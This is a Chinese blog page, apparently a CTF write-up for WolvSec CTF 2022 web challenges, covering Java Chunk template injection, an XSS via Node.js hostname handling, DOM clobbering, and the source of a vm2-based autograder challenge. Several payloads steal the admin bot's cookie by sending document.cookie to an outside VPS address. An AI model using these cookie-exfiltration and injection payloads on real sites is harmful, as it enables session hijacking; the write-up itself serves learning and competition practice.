@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="Y0ng的博客">
+<meta property="og:url" content="http://example.com/2022/03/29/WolveCTF/index.html">
+<meta property="og:site_name" content="Y0ng的博客">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329192052588.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/ctfshowimage-20220327141246968.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220327141444675.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220327141515475.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220327142036059.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329152720003.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329153356998.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329154059717.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329155006962.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329160759020.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329174041803.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329180308843.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329180345176.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329181946015.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329182534181.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329191335796.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329191359560.png">
+<meta property="article:published_time" content="2022-03-29T13:03:35.211Z">
+<meta property="article:modified_time" content="2022-03-29T13:02:59.627Z">
+<meta property="article:author" content="Y0ng">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329192052588.png">
+
+<link rel="canonical" href="http://example.com/2022/03/29/WolveCTF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | Y0ng的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Y0ng的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">17</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">168</span></a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/29/WolveCTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cys.jpg">
+      <meta itemprop="name" content="Y0ng">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-03-29 21:03:35 / 修改时间：21:02:59" itemprop="dateCreated datePublished" datetime="2022-03-29T21:03:35+08:00">2022-03-29</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329192052588.png" alt="image-20220329192052588"></p>
+<a id="more"></a>
+
+<h1 id="java"><a href="#java" class="headerlink" title="java???"></a>java???</h1><p>Java has template engines too!</p>
+<p>使用了一套模板 Chunk Templates，项目地址 <a target="_blank" rel="noopener" href="https://github.com/tomj74/chunk-templates">https://github.com/tomj74/chunk-templates</a></p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/ctfshowimage-20220327141246968.png" alt="image-20220327141246968"></p>
+<p>代码逻辑很简单，存在$flag变量，过滤了 <code>$</code></p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220327141444675.png" alt="image-20220327141444675"></p>
+<p>渲染时存在模板注入</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220327141515475.png" alt="image-20220327141515475"></p>
+<p>也就是说<strong>找一种表示变量的方式来替换 $变量 的方式</strong> ，翻看文档，在久远的英文历史文档中迷失了自我….   {$flag}</p>
+<p>最后在 <a target="_blank" rel="noopener" href="https://www.x5software.com/chunk/wiki/index.php?title=Chunk2.4">https://www.x5software.com/chunk/wiki/index.php?title=Chunk2.4</a></p>
+<p>还好，找到了替换</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220327142036059.png" alt="image-20220327142036059"></p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;submit?name&#x3D;&#123;~flag&#125;&amp;color&#x3D;123</span><br></pre></td></tr></table></figure>
+
+<p>还有利用urldecode</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;.&#123;%24flag%7d|urldecode()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>FLAG：wsc{j4v4_ch4ls_4r3_r4r3_513156}</p>
+<h1 id="XSS-401"><a href="#XSS-401" class="headerlink" title="XSS 401"></a>XSS 401</h1><p>Can you steal the admin bot’s cookie?</p>
+<p>Note: The version of nodejs running the admin bot is: v12.22.1</p>
+<p>nodejs题目，发送一个url，admin会在browser中看到，审计一下代码</p>
+<p>flag在cookie中</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329152720003.png" alt="image-20220329152720003"></p>
+<p>看一下提交url后的逻辑，首先判断是否以http https开头</p>
+<p>然后req.hostname返回主机名，是不可控的，为wsc-2022-web-5-bvel4oasra-uc.a.run.app，需要等于我们传进去url的hostname，才能让bot看到</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329153356998.png" alt="image-20220329153356998"></p>
+<p>而且hostname返回值会将大写转为小写</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329154059717.png" alt="image-20220329154059717"></p>
+<p>但是注意到处理消息时缺少了escape操作，导致了可能存在xss，找到了CVE-2021-22931，没有poc。</p>
+<blockquote>
+<p>16.6.0、14.17.4 和 12.22.4 之前的 Node.js 易受远程代码执行、XSS、应用程序崩溃的影响，因为 Node.js dns 库中缺少对域名服务器返回的主机名的输入验证，这可能导致在使用该库的应用程序中输出错误的主机名（导致域劫持）和注入漏洞。</p>
+</blockquote>
+<p>尝试注入，没有回显</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;&lt;script&gt;alert(1#&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329155006962.png" alt="image-20220329155006962"></p>
+<p>最后卡在这里，最后看到wp：<a target="_blank" rel="noopener" href="https://github.com/0xGodson/blogs/blob/master/_posts/2022-03-28-wcs-xss401.md">https://github.com/0xGodson/blogs/blob/master/_posts/2022-03-28-wcs-xss401.md</a></p>
+<p>简单的研究了一下遇到一些特殊字符会导致错误，而且最后会自动补全前面的标签，如中间的图</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329160759020.png" alt="image-20220329160759020"></p>
+<p><strong>HostName 的一些 RFC</strong></p>
+<ul>
+<li><p>不应包含空格</p>
+</li>
+<li><p>不管是大写还是小写，主机名都会被浏览器自动转换为小写</p>
+</li>
+<li><p>这里有一些破坏主机名的字符</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">? &#x2F; \ # @ </span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>然后现在就是</p>
+<ul>
+<li>绕过空格</li>
+<li>hostname允许使用Unicode</li>
+<li>找到一个Unicode代替空格</li>
+<li>绕过 <code>/</code> ，因为你反弹vps时 <code>://</code> 是必不可少的</li>
+</ul>
+<p>根据wp，payload利用了 <code>%0C</code>，</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg%0Conload&#x3D;alert()&gt;</span><br></pre></td></tr></table></figure>
+
+<p>给出两种思路</p>
+<p>payload1</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;&lt;svg%0Conload&#x3D;eval(location.hash.slice(1))&gt;#window.location&#x3D;&#39;http:&#x2F;&#x2F;1.116.110.61:4000?cookie&#x3D;&#39;+document.cookie</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>eval执行js代码</li>
+<li>location.hash返回的字符串是 URL 的锚部分(从 # 号开始的部分) 这里是不检测的</li>
+</ul>
+<p>payload2 未成功</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;&lt;svg%0Conload&#x3D;document.location&#x3D;&quot;http&quot;+atob(&#39;Oi8v&#39;)+&quot;1.116.110.61:4000&quot;+atob(&#39;ek8v&#39;).substr(2,2)+btoa(document.cookie)&gt;</span><br><span class="line"></span><br><span class="line">?url&#x3D;http:&#x2F;&#x2F;d.com;&lt;svg%250conload&#x3D;&quot;window.location.href&#x3D;(location.href.substr(0,8).replace(&#39;s&#39;,&#39;&#39;)%252b&#39;ip_addr&#39;%252blocation.href.substr(5,1)%252b&#39;1234&#39;%252blocation.href.substr(6,1)%252bdocument.cookie)&quot;&gt;a.c</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用base编码</li>
+<li>substr切割</li>
+</ul>
+<p>最终payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;wsc-2022-web-5-bvel4oasra-uc.a.run.app&#x2F;visit?url&#x3D;https:&#x2F;&#x2F;wsc-2022-web-5-bvel4oasra-uc.a.run.app&#x2F;visit?url&#x3D;http:&#x2F;&#x2F;&lt;svg%0Conload&#x3D;eval(location.hash.slice(1))&gt;#window.location&#x3D;&#39;http:&#x2F;&#x2F;1.116.110.61:4000?cookie&#x3D;&#39;+document.cookie</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329174041803.png" alt="image-20220329174041803"></p>
+<p>FLAG：wsc{wh0_kn3w_d0m41n_x55_w4s_4_th1n6}</p>
+<h1 id="Don’t-Only-Mash…-Clobber"><a href="#Don’t-Only-Mash…-Clobber" class="headerlink" title="Don’t Only Mash… Clobber!"></a>Don’t Only Mash… Clobber!</h1><p>Submit an image link to our “evaluator” and steal their cookie!</p>
+<p>先看代码逻辑</p>
+<p>visit路由下同上道题目，传入一个url，bot会点开看</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329180308843.png" alt="image-20220329180308843"></p>
+<p>personalize路由下，提交一个url，然后传入到了img标签中，然后提示没有bypass CSP的步骤</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329180345176.png" alt="image-20220329180345176"></p>
+<p>闭合可以注入html</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329181946015.png" alt="image-20220329181946015"></p>
+<p>然后题目还有app.js</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">window.onload &#x3D; () &#x3D;&gt; &#123;</span><br><span class="line">    const imgSrc &#x3D; document.getElementById(&#39;user-image&#39;).src</span><br><span class="line">    document.getElementById(&#39;user-image-info&#39;).innerText &#x3D; imgSrc</span><br><span class="line"></span><br><span class="line">    if (DEBUG_MODE) &#123;</span><br><span class="line">        &#x2F;&#x2F; In debug mode, send the image url to our debug endpoint for logging purposes.</span><br><span class="line">        &#x2F;&#x2F; We&#39;d normally use fetch() but our CSP won&#39;t allow that so use an &lt;img&gt; instead.</span><br><span class="line">        &#x2F;&#x2F; 在调试模式下，将图像 url 发送到我们的调试端点以进行日志记录。</span><br><span class="line">        &#x2F;&#x2F; 我们通常会使用 fetch()，但我们的 CSP 不允许这样做，所以使用 &lt;img&gt; 代替。</span><br><span class="line">        document.getElementById(&#39;body&#39;).insertAdjacentHTML(&#39;beforeend&#39;, &#96;&lt;img src&#x3D;&quot;$&#123;DEBUG_LOGGING_URL&#125;?auth&#x3D;$&#123;btoa(document.cookie)&#125;&amp;image&#x3D;$&#123;btoa(imgSrc)&#125;&quot;&gt;&#96;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有一个DEBUG_MODE 参数未定义，if的操作经过翻译会发起一个携带cookie的请求，如果我们可控 DEBUG_LOGGING_URL 就可以将cookie发送到我们的vps上</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329182534181.png" alt="image-20220329182534181"></p>
+<p>利用前面那个html的注入地方来定义 DEBUG_MODE 与 DEBUG_LOGGING_URL  这样就完全可控</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;wsc-2022-web-2-bvel4oasra-uc.a.run.app&#x2F;personalize?image&#x3D;http:&#x2F;&#x2F;google.com&#x2F;a.png&quot;&gt;&lt;a id&#x3D;&quot;DEBUG_MODE&quot;&gt;&lt;a id&#x3D;&quot;DEBUG_LOGGING_URL&quot; href&#x3D;&quot;http:&#x2F;&#x2F;1.116.110.61:4000&#x2F;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里有个问题，确实可以返回cookie，但是传的是https，可以弄个https服务器，不晓得有没有其平台的之类的更方便的接受</p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329191335796.png" alt="image-20220329191335796"></p>
+<p><img src="https://raw.githubusercontent.com/yongsheng220/image/main/wolvsecimage-20220329191359560.png" alt="image-20220329191359560"></p>
+<h1 id="Autoraider"><a href="#Autoraider" class="headerlink" title="Autoraider"></a>Autoraider</h1><p>My EECS 982 project is due tonight, and I haven’t started it! Can you help me out?</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> upload = multer();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> redis = <span class="built_in">require</span>(<span class="string">&#x27;redis&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> SESSION_SECRET = process.env.REDIS_SECRET || <span class="string">&#x27;secret&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> FLAG = process.env.FLAG || <span class="string">&#x27;wsc&#123;dummy&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> NUM_QUESTIONS = <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sessionOptions = &#123;</span><br><span class="line">    secret: SESSION_SECRET,</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ------ For running the challenge in Google Cloud with Redis session storage -----</span></span><br><span class="line"><span class="comment">// Ignore this if running locally</span></span><br><span class="line"><span class="keyword">if</span>(process.env.REDIS_IP) &#123;</span><br><span class="line">    <span class="keyword">var</span> RedisStore = <span class="built_in">require</span>(<span class="string">&#x27;connect-redis&#x27;</span>)(session)</span><br><span class="line">    <span class="keyword">const</span> client = redis.createClient(&#123;</span><br><span class="line">      <span class="string">&quot;host&quot;</span>: process.env.REDIS_IP</span><br><span class="line">    &#125;);</span><br><span class="line">    client.on(<span class="string">&#x27;connect&#x27;</span>, <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;Connected to Redis!&#x27;</span>));</span><br><span class="line">    client.on(<span class="string">&quot;error&quot;</span>, <span class="function">(<span class="params">error</span>) =&gt;</span> <span class="built_in">console</span>.error(<span class="string">&#x27;Redis Error: &#x27;</span>, error));</span><br><span class="line">    sessionOptions[<span class="string">&#x27;store&#x27;</span>] = <span class="keyword">new</span> RedisStore(&#123; <span class="attr">client</span>: client &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">app.use(session(sessionOptions));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make sure correct answers always exist in session</span></span><br><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.answers) &#123;</span><br><span class="line">        req.session.answers = generateAnswers();</span><br><span class="line">    &#125;</span><br><span class="line">    next();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(express.static(<span class="string">&#x27;public&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// for parsing application/json</span></span><br><span class="line">app.use(bodyParser.json()); </span><br><span class="line"></span><br><span class="line"><span class="comment">// for parsing application/xwww-</span></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;)); </span><br><span class="line"><span class="comment">//form-urlencoded</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// for parsing multipart/form-data</span></span><br><span class="line">app.use(upload.array()); </span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/upload&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> code = req.body.code;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> vm = <span class="keyword">new</span> VM(&#123;</span><br><span class="line">            timeout: <span class="number">50</span>,</span><br><span class="line">            allowAsync: <span class="literal">false</span></span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Test for correct responses for given person</span></span><br><span class="line">        <span class="comment">// Correct answers retrieved from user session</span></span><br><span class="line">        <span class="keyword">const</span> person = req.session.answers.person;</span><br><span class="line">        <span class="keyword">const</span> responses = req.session.answers.responses;</span><br><span class="line">        <span class="keyword">let</span> testCases = responses.map(<span class="function">(<span class="params">response, i</span>) =&gt;</span> &#123; </span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&#x27;person&#x27;</span>: person, <span class="string">&#x27;questionNumber&#x27;</span>: i, <span class="string">&#x27;correct&#x27;</span>: response&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// Add edge case</span></span><br><span class="line">        testCases.push(</span><br><span class="line">            &#123;<span class="string">&#x27;person&#x27;</span>: <span class="number">9999999999</span>, <span class="string">&#x27;questionNumber&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;correct&#x27;</span>: <span class="literal">false</span>&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Go through each test case</span></span><br><span class="line">        <span class="keyword">for</span>(i <span class="keyword">in</span> testCases) &#123;</span><br><span class="line">            <span class="keyword">const</span> testCase = testCases[i];</span><br><span class="line">            <span class="keyword">const</span> result = testCode(vm, code, testCase.person, testCase.questionNumber, testCase.correct);</span><br><span class="line">            <span class="keyword">if</span>(result.error) &#123;</span><br><span class="line">                req.session.pass = <span class="literal">false</span>;</span><br><span class="line">                res.send(result.message);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(!result.pass) &#123;</span><br><span class="line">                req.session.pass = <span class="literal">false</span>;</span><br><span class="line">                res.redirect(<span class="string">&#x27;submission.html&#x27;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        </span><br><span class="line">        req.session.pass = <span class="literal">true</span>;</span><br><span class="line">        res.redirect(<span class="string">&#x27;submission.html&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        res.send(<span class="string">&#x27;Server side error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/grade&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.session.pass || <span class="literal">false</span>) &#123;  <span class="comment">// session.pass 需要为true</span></span><br><span class="line">        res.send(<span class="string">&#x27;Tests passed! Here is the flag: &#x27;</span> + FLAG);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        req.session.answers = generateAnswers();</span><br><span class="line">        res.send(<span class="string">&#x27;Tests failed. Correct answers have been changed!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateAnswers</span>(<span class="params"></span>) </span>&#123;  <span class="comment">//生成正确答案 随机不可控</span></span><br><span class="line">    answers = &#123;</span><br><span class="line">        <span class="string">&#x27;person&#x27;</span>: <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">7753000</span>), <span class="comment">// Random person in the world</span></span><br><span class="line">        <span class="string">&#x27;responses&#x27;</span>: []</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; NUM_QUESTIONS; i++) &#123;</span><br><span class="line">        answers.responses.push(<span class="built_in">Math</span>.random() &gt; <span class="number">0.5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> answers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testCode</span>(<span class="params">vm, code, person, questionNumber, correct</span>) </span>&#123;</span><br><span class="line">    ret = &#123;</span><br><span class="line">        message: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        error: <span class="literal">false</span>,</span><br><span class="line">        pass: <span class="literal">true</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> result = vm.run(<span class="string">`oracle(<span class="subst">$&#123;person&#125;</span>, <span class="subst">$&#123;questionNumber&#125;</span>);<span class="subst">$&#123;code&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">typeof</span> result !== <span class="string">&#x27;boolean&#x27;</span> || result !== correct) &#123;</span><br><span class="line">            ret.pass = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        ret.message = <span class="string">&#x27;Code threw error! Please resubmit!&#x27;</span>;</span><br><span class="line">        ret.error = <span class="literal">true</span>;</span><br><span class="line">        ret.pass = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Autograder server listening on port 80!&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
